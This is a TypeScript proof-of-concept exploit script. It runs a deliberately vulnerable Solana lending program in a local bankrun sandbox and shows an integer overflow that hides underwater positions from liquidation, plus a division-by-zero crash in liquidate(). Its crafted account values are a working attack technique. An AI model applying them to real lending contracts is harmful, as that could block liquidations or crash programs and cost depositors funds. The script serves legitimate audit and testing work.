/**
 * BANKRUN EXPLOIT: Integer Overflow + Division by Zero in Liquidation (SEM-003/004)
 *
 * Vulnerability A (SEM-003): liquidate() computes interest = borrowed * interest_rate * total_borrows
 * using unchecked u64 multiplication. Overflow wraps to small number, making health appear high.
 *
 * Vulnerability B (SEM-004): Division by zero when borrowed + interest == 0.
 *
 * This exploit runs against the COMPILED SBF binary via solana-bankrun.
 */

import { start } from "solana-bankrun";
import {
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  Keypair,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import * as crypto from "crypto";

const PROGRAM_ID = new PublicKey("BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K");

function ixDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`global:${name}`).digest()
  ).subarray(0, 8);
}

function accDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`account:${name}`).digest()
  ).subarray(0, 8);
}

function encodeU64(val: bigint): Buffer {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(val);
  return buf;
}

function encodeU16(val: number): Buffer {
  const buf = Buffer.alloc(2);
  buf.writeUInt16LE(val);
  return buf;
}

async function main() {
  console.log("═══════════════════════════════════════════════════════════");
  console.log(" EXPLOIT: Integer Overflow + Division by Zero (SEM-003/004)");
  console.log(" Target: vulnerable_lending::liquidate()");
  console.log(" Binary: vuln_lending.so (compiled SBF)");
  console.log("═══════════════════════════════════════════════════════════");
  console.log();

  const RENT_POOL = 1113600;
  const RENT_USER = 1089600;

  // ═══ TEST A: Integer Overflow Prevents Liquidation ═══
  console.log("--- TEST A: Integer Overflow ---");
  console.log();

  const poolKpA = Keypair.generate();
  const userKpA = Keypair.generate();
  const authorityA = Keypair.generate();

  const [vaultPdaA, vaultBumpA] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), poolKpA.publicKey.toBuffer()],
    PROGRAM_ID
  );

  // Pool with carefully chosen total_borrows to make interest wrap to near-zero
  // Formula: interest = borrowed * interest_rate * total_borrows
  // We need: 1e9 * 500 * total_borrows ≈ k * 2^64 (wraps to small number)
  // 2^64 / (1e9 * 500) ≈ 36,893,488,147
  const largeTotalBorrows = BigInt("36893488147");
  const poolDataA = Buffer.concat([
    accDisc("Pool"),
    authorityA.publicKey.toBuffer(),
    encodeU64(BigInt(1000 * LAMPORTS_PER_SOL)),
    encodeU64(largeTotalBorrows),
    encodeU16(500),
    Buffer.from([vaultBumpA]),
  ]);

  // User: deposited 1 SOL, borrowed 1 SOL
  // True interest is enormous (borrowed * 500 * 36.8B ≈ 18.4 quintillion)
  // But overflow wraps it to ~0.21 SOL, so health appears ~82 (healthy)
  // True health should be ~0 (deeply underwater from interest)
  const userBorrowed = BigInt(1_000_000_000); // 1 SOL
  const userDeposited = BigInt(1_000_000_000); // 1 SOL
  const userDataA = Buffer.concat([
    accDisc("UserAccount"),
    authorityA.publicKey.toBuffer(),
    encodeU64(userDeposited),
    encodeU64(userBorrowed),
  ]);

  const contextA = await start(
    [{ name: "vuln_lending", programId: PROGRAM_ID }],
    [
      { address: poolKpA.publicKey, info: { lamports: RENT_POOL, data: poolDataA, owner: PROGRAM_ID, executable: false } },
      { address: userKpA.publicKey, info: { lamports: RENT_USER, data: userDataA, owner: PROGRAM_ID, executable: false } },
    ]
  );

  const raw = userBorrowed * BigInt(500) * largeTotalBorrows;
  const wrapped = raw % (BigInt(2) ** BigInt(64));
  console.log(`[1] Overflow scenario:`);
  console.log(`    borrowed: ${userBorrowed} lamports`);
  console.log(`    interest_rate: 500, total_borrows: ${largeTotalBorrows}`);
  console.log(`    Honest interest: ${raw} (overflows u64)`);
  console.log(`    u64 wrapped:     ${wrapped}`);
  console.log();

  console.log("[2] Calling liquidate (user IS underwater, but overflow hides it)...");

  const liquidateIxA = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: poolKpA.publicKey, isSigner: false, isWritable: false },
      { pubkey: userKpA.publicKey, isSigner: false, isWritable: false },
      { pubkey: contextA.payer.publicKey, isSigner: true, isWritable: false },
    ],
    data: ixDisc("liquidate"),
  });

  const [bhA] = await contextA.banksClient.getLatestBlockhash();
  const txA = new Transaction();
  txA.recentBlockhash = bhA;
  txA.feePayer = contextA.payer.publicKey;
  txA.add(liquidateIxA);
  txA.sign(contextA.payer);

  let overflowResult = "unknown";
  try {
    await contextA.banksClient.processTransaction(txA);
    overflowResult = "liquidation_succeeded";
    console.log("    Liquidation succeeded (user correctly found underwater)");
  } catch (e: any) {
    const msg = e.message || String(e);
    if (msg.includes("HealthyPosition") || msg.includes("0x1772")) {
      overflowResult = "overflow_confirmed";
      console.log("    Liquidation BLOCKED: program thinks position is healthy!");
      console.log("    (overflow wrapped interest to small number => high health)");
    } else if (msg.includes("panicked") || msg.includes("ProgramFailed") || msg.includes("overflow")) {
      overflowResult = "program_panicked";
      console.log("    Program PANICKED (overflow detected at runtime)");
    } else {
      overflowResult = "error";
      console.log(`    Error: ${msg.substring(0, 120)}`);
    }
  }
  console.log();

  // ═══ TEST B: Division by Zero ═══
  console.log("--- TEST B: Division by Zero ---");
  console.log();

  const poolKpB = Keypair.generate();
  const userKpB = Keypair.generate();
  const authorityB = Keypair.generate();

  const [, vaultBumpB] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), poolKpB.publicKey.toBuffer()],
    PROGRAM_ID
  );

  // Pool with zero total_borrows
  const poolDataB = Buffer.concat([
    accDisc("Pool"),
    authorityB.publicKey.toBuffer(),
    encodeU64(BigInt(0)),
    encodeU64(BigInt(0)),
    encodeU16(500),
    Buffer.from([vaultBumpB]),
  ]);

  // User with zero borrows: borrowed + interest == 0 => division by zero
  const userDataB = Buffer.concat([
    accDisc("UserAccount"),
    authorityB.publicKey.toBuffer(),
    encodeU64(BigInt(10 * LAMPORTS_PER_SOL)),
    encodeU64(BigInt(0)),
  ]);

  const contextB = await start(
    [{ name: "vuln_lending", programId: PROGRAM_ID }],
    [
      { address: poolKpB.publicKey, info: { lamports: RENT_POOL, data: poolDataB, owner: PROGRAM_ID, executable: false } },
      { address: userKpB.publicKey, info: { lamports: RENT_USER, data: userDataB, owner: PROGRAM_ID, executable: false } },
    ]
  );

  console.log("[3] Calling liquidate with zero-borrow user...");
  console.log("    health = deposited * 100 / (borrowed + interest)");
  console.log("    health = 10_000_000_000 * 100 / (0 + 0) => DIVISION BY ZERO");
  console.log();

  const liquidateIxB = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: poolKpB.publicKey, isSigner: false, isWritable: false },
      { pubkey: userKpB.publicKey, isSigner: false, isWritable: false },
      { pubkey: contextB.payer.publicKey, isSigner: true, isWritable: false },
    ],
    data: ixDisc("liquidate"),
  });

  const [bhB] = await contextB.banksClient.getLatestBlockhash();
  const txB = new Transaction();
  txB.recentBlockhash = bhB;
  txB.feePayer = contextB.payer.publicKey;
  txB.add(liquidateIxB);
  txB.sign(contextB.payer);

  let divByZeroResult = "unknown";
  try {
    await contextB.banksClient.processTransaction(txB);
    divByZeroResult = "succeeded";
    console.log("    Transaction succeeded (unexpected)");
  } catch (e: any) {
    const msg = e.message || String(e);
    divByZeroResult = "panicked";
    console.log(`    Program CRASHED: ${msg.substring(0, 120)}`);
    console.log("    (confirms division by zero causes program panic)");
  }

  // ═══ VERDICT ═══
  console.log();
  console.log("═══════════════════════════════════════════════════════════");
  console.log(" EXPLOIT RESULTS (compiled SBF binary):");
  const overflow_str = overflowResult === "overflow_confirmed"
    ? "CONFIRMED --- overflow prevents liquidation"
    : overflowResult === "program_panicked"
    ? "CONFIRMED --- program panics on overflow"
    : `Result: ${overflowResult}`;
  const divzero_str = divByZeroResult === "panicked"
    ? "CONFIRMED --- program panics on zero borrows"
    : `Result: ${divByZeroResult}`;
  console.log(`   Integer overflow (SEM-003): ${overflow_str}`);
  console.log(`   Division by zero (SEM-004): ${divzero_str}`);
  console.log("═══════════════════════════════════════════════════════════");
}

main().catch((e) => {
  console.error("Exploit execution error:", e);
  process.exit(1);
});
